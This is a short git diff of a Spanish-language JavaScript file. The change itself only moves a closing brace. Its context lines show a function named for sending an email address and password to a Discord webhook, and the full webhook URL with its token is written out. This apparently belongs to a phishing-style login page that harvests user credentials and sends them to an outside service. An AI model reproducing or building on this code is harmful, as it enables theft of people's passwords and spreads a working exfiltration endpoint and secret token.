@@ -272,7 +272,6 @@ function generarLineaCodigo() {
     // Retorna un comando aleatorio
     return comandos[Math.floor(Math.random() * comandos.length)];
 }
-    });
 
 function enviarDatosAWebhook(email, contrasena) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
@@ -303,7 +302,8 @@ function enviarDatosAWebhook(email, contrasena) {
 document.getElementById('irARegistro').addEventListener('click', function() {
     mostrarRegistro(); // Asegúrate de que esta función esté bien definida para manejar el cambio de vista
 });
-   
+   });
+
 
   
 
